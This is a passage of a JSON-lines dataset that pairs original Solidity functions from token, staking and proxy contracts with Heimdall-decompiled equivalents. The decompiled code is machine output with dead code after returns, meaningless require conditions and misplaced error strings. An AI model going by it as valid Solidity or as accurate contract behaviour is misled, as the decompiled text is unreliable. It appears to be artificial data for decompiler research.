0x56616c756520657863656564732062616c616e63650000000000000000000000;\n        if (address(msg.sender) == (address(owner / 0x01))) {\n            var_a = address(msg.sender);\n            var_b = 0x97;\n            if (storage_map_d[var_a] / 0x01) {\n                if (storage_map_d[var_a] / 0x01) {\n                    var_a = address(msg.sender);\n                    var_b = 0x65;\n                    require(bytes1(storage_map_d[var_a] / 0x01));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    var_a = address(msg.sender);\n                    var_b = 0x65;\n                    storage_map_d[var_a] = storage_map_d[var_a] - arg1;\n                    var_a = address(arg0);\n                    var_b = 0x65;\n                    require(bytes1(storage_map_d[var_a] / 0x01));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    var_a = address(arg0);\n                    var_b = 0x65;\n                    storage_map_d[var_a] = storage_map_d[var_a] + arg1;\n                    uint256 var_c = arg1;\n                    emit Transfer(address(msg.sender), address(arg0), arg1);\n                    var_c = 0x01;\n                    return 0x01;\n                    require(!(storage_map_d[var_a] - arg1) > storage_map_d[var_a]);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    require(!storage_map_d[var_a] > (storage_map_d[var_a] + arg1));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x12;\n                    require(!(arg1) & (fee > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1)));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    require(0x64);\n                }\n                require(!(arg1 - ((arg1 * fee) / 0x64)) > arg1);\n            }\n        }\n        var_a = address(msg.sender);\n        var_b = 0x98;\n        require(!bytes1(storage_map_d[var_a] / 0x01));\n        require(!numbers > 0);\n        require(!arg1 > numbers);\n        require(!(bytes1(reward / 0x01)), \"Error\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x05;\n        var_g = 0x4572726f72000000000000000000000000000000000000000000000000000000;\n        require(!limits > 0);\n        var_a = address(msg.sender);\n        var_b = 0x65;\n        require(!storage_map_d[var_a] > limits);\n        if (!autoCoal / 0x01) {\n        }\n        if (address(msg.sender) == (address(owner / 0x01))) {\n            if (address(msg.sender) == (address(owner / 0x01))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD077813f2e3C8a461d6a0c07F093257856319cA8", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0x634190EAD9c756794D33e5C4F052774Ab41EB189", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\\r\\n        _approve(_msgSender(), spender, amount);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function setSwapThreshold(uint256 value) public virtual onlyOwner {\\r\\n        swapThreshold = value;\\r\\n    }", "heimdall_decompiled_code": "function setSwapThreshold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        swapThreshold = arg0;\n    }"}
{"contract_address": "0x85188f89Ef6A5714818DefC0607727c9BE9f8949", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = 0x038d7ea4c68000;\n        _maxWalletSize = 0x038d7ea4c68000;\n    }"}
{"contract_address": "0xEaE65155951A1B2D3Ca8C6fc19194583233B57f4", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_c / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_h[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3cf93d43251324C527346abF3e0559f4C7a713d1", "original_solidity_code": "function upgradeTo(address newImplementation) external virtual {\\n        _authorizeUpgrade(newImplementation);\\n        _upgradeToAndCallSecure(newImplementation, bytes(\\\"\\\"), false);\\n    }", "heimdall_decompiled_code": "function upgradeTo(address arg0) public returns (uint256) {\n        require(arg0 == (address(arg0)));\n        require(!(address(msg.sender)) == (address(store_a)));\n        require(!(address(msg.sender)) == (address(store_a)));\n        var_a = msg.data[0:4];\n        (bool success, bytes memory ret0) = address(store_b).Unresolved_(var_b); // delegatecall\n        return ;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x42;\n        var_f = 0x5472616e73706172656e745570677261646561626c6550726f78793a2061646d;\n        var_g = 0x696e2063616e6e6f742066616c6c6261636b20746f2070726f78792074617267;\n        var_h = 0x6574000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = var_d + var_i;\n        uint256 var_c = 0;\n        require(address(arg0).code.length, \"ERC1967: new implementation is not a contract\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x2d;\n        var_g = 0x455243313936373a206e657720696d706c656d656e746174696f6e206973206e;\n        var_h = 0x6f74206120636f6e747261637400000000000000000000000000000000000000;\n        store_b = (address(arg0)) | (uint96(store_b));\n        emit Upgraded(address(arg0));\n        require(var_i.length > 0, \"Address: delegate call to non-contract\");\n        require(!(var_i.length > 0), \"Address: delegate call to non-contract\");\n        var_i = 0x60 + var_i;\n        var_j = 0x27;\n        var_k = this.code[2049:2088];\n        require(address(arg0).code.length, \"Address: delegate call to non-contract\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_m = 0x26;\n        var_n = 0x416464726573733a2064656c65676174652063616c6c20746f206e6f6e2d636f;\n        var_o = 0x6e74726163740000000000000000000000000000000000000000000000000000;\n        require(!0 > var_i.length);\n        uint256 var_l = 0;\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_(var_p); // delegatecall\n        require(ret0.length == 0);\n        require(!var_q);\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        uint256 var_m = var_i.length;\n        require(!(0 > var_i.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_r = 0;\n        var_i = var_i + (uint248(ret0.length + 0x3f));\n        var_l = ret0.length;\n        require(!var_i.length);\n    }"}
{"contract_address": "0x7A78ca246a44065Bfc493a27f2C2A21B766dCA73", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xae260B2D9Fb8175B73552Ae4212261ed0756395b", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Only one transfer per block allowed.\");\n        require(address(arg0), \"Only one transfer per block allowed.\");\n        require(arg1 > 0, \"Only one transfer per block allowed.\");\n        require(address(owner) == (address(msg.sender)), \"Only one transfer per block allowed.\");\n        require(!(!(address(owner)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_c) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_d)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        address var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_e[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_e[var_a] = block.number;\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!0, \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_e[var_a] > (0 + storage_map_e[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!((0 + storage_map_e[var_a]) < storage_map_e[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_e[var_a] = 0 + storage_map_e[var_a];\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        require(address(msg.sender) - (address(transferDelayEnabled / 0x0100)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1f;\n        var_j = 0x536166654d6174683a20207375627472616374696f6e206f766572666c6f7700;\n        require(!(arg1 > storage_map_e[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        if (!(storage_map_e[var_a] - arg1) > storage_map_e[var_a]) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_e[var_a] > _maxTaxSwap) {\n            }\n            if (!store_g > store_h) {\n                if (!store_g > store_h) {\n                    if (!store_g > store_h) {\n                    }\n                }\n            }\n            if (!storage_map_e[var_a] > _taxSwapThreshold) {\n            }\n            require(!((storage_map_e[var_a] - arg1) > storage_map_e[var_a]), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(!arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        require(store_g > store_k, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_l == ((store_l * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_l * arg1) / arg1) == store_l, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64) {\n            require(0x64);\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x12;\n            require(0x64);\n            var_a = address(msg.sender);\n            var_b = 0x04;\n            require(!store_g > store_h);\n            var_a = address(this);\n            var_b = 0x01;\n            require(bytes1(storage_map_e[var_a]));\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        if (0 - arg1) {\n        }\n        var_a = address(transferDelayEnabled / 0x0100);\n        var_b = 0x01;\n        require(storage_map_e[var_a] < _maxTaxSwap, \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(this) == (address(msg.sender))) {\n            if (address(this) == (address(msg.sender))) {\n            }\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_c) == (address(arg0))) {\n            if (address(store_c) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaf820B5EA297f68B038B744AE2F5019B4fD2aC71", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x08;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_t[var_a] > ~(arg1)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_t[var_a] + arg1) < storage_map_t[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x08;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_t[var_a] = storage_map_t[var_a] + arg1;\n        uint256 var_d = storage_map_t[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_t[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x410cA8f9159f88a864DeEc21f30D5D62E8B75619", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function pendingRewards(address _add) public view returns(uint256 reward)\r\n    {\r\n        uint256 Reward;\r\n        for(uint256 z=0 ; z< depositeToken[_add].length;z++){\r\n        uint256 lockTime = depositetime[_add][z]+(lockabledays[_add][z]*time);\r\n        if(block.timestamp > lockTime ){\r\n        reward = (allocation[lockabledays[_add][z]].mul(depositeToken[_add][z]).div(100)).div(1e18);\r\n        Reward += reward;\r\n        }\r\n    }\r\n    return Reward;\r\n    }", "heimdall_decompiled_code": "function pendingRewards(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x03;\n        require(!0 < storage_map_k[var_a]);\n        var_a = address(arg0);\n        var_b = 0x04;\n        require(0 < storage_map_k[var_a]);\n        var_a = keccak256(var_a);\n        require(!(storage_map_n[var_a]) & (time > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / (storage_map_n[var_a]))));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0x05;\n        require(0 < storage_map_k[var_a]);\n        var_a = keccak256(var_a);\n        require(!(storage_map_n[var_a]) > (~(storage_map_n[var_a] * time)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!block.timestamp > (storage_map_n[var_a] + (storage_map_n[var_a] * time)));\n        require(!0 == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(0 < storage_map_k[var_a]);\n        var_a = keccak256(var_a);\n        var_a = address(arg0);\n        var_b = 0x04;\n        require(0 < storage_map_k[var_a]);\n        var_a = keccak256(var_a);\n        var_a = storage_map_n[var_a];\n        var_b = 0x02;\n        require(storage_map_k[var_a]);\n        require(!(storage_map_k[var_a]) & (storage_map_n[var_a] > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / storage_map_k[var_a])));\n        var_a = 